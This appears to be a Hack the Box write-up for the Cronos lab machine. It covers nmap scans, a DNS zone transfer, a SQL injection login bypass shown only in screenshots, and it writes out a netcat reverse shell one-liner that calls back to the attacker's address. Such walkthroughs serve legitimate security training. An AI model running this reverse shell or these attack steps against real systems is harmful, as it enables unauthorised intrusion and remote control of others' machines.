# Hack the Box - Cronos

```CSS
▶ nmap -Pn -sS -O -p- 10.10.10.13 -T4 --min-rate 1000 -oN ports.nmap

Nmap scan report for 10.10.10.13
Host is up (0.18s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
53/tcp open  domain
80/tcp open  http
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=5/16%OT=22%CT=1%CU=35700%PV=Y%DS=2%DC=I%G=Y%TM=64630A9
OS:9%P=x86_64-pc-linux-gnu)SEQ(SP=FE%GCD=1%ISR=109%TI=Z%CI=I%II=I%TS=8)OPS(
OS:O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST11
OS:NW7%O6=M53CST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(
OS:R=Y%DF=Y%T=40%W=7210%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Network Distance: 2 hops

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 83.45 seconds
```

```CSS
▶ nmap -sC -sV -p 22,53,80 10.10.10.13 -oN services.nmap

Nmap scan report for 10.10.10.13
Host is up (0.18s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 18b973826f26c7788f1b3988d802cee8 (RSA)
|   256 1ae606a6050bbb4192b028bf7fe5963b (ECDSA)
|_  256 1a0ee7ba00cc020104cda3a93f5e2220 (ED25519)
53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.22 seconds
```

---

## Host Information
```CSS
▶ nslookup 10.10.10.13 10.10.10.13
```
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/5f8b3c5a-66ec-4668-ac83-682205159d32)
Domain Name: ns1.cronos.htb

---

## Zone Transfer
```
▶ dig axfr @10.10.10.13 cronos.htb
```
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/f37c34e6-4d34-4565-87d3-d57ee7464ad4)
Domain Name: admin.cronos.htb

---

## HTTP 80

URL: `http://cronos.htb`
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/5d2fecb6-cef4-421c-8578-37bfc1d978e4)

URL: `http://admin.cronos.htb`
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/0fc5cbe0-b195-4dfd-aeea-79270f2ad30b)

---

## SQL Injectiion

![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/c7c14eb8-7b03-4137-ad50-5c3055c16fc6)
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/7d97f11f-291d-4d3f-8a4f-1cef755d648c)
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/2c8419e7-77d5-457d-a8eb-b80229de3c1d)

---

## Initial Foothold

![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/4e29b9df-4240-487b-98a4-6a4ce682140b)
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/c8eb3f14-7b88-4eb2-9f7c-1c1412221f29)

Reverse Bash Shell:
```CSS
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.24 9001 >/tmp/f
```
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/4ccaedd1-7c22-4e29-8abf-604bffdac4f7)
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/8fffd4c2-df59-48a1-89ef-d19e17c3b03f)

### Upgrade Shell to Interactive TTY
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/f1518828-bc05-447a-8313-5a248395867b)

---

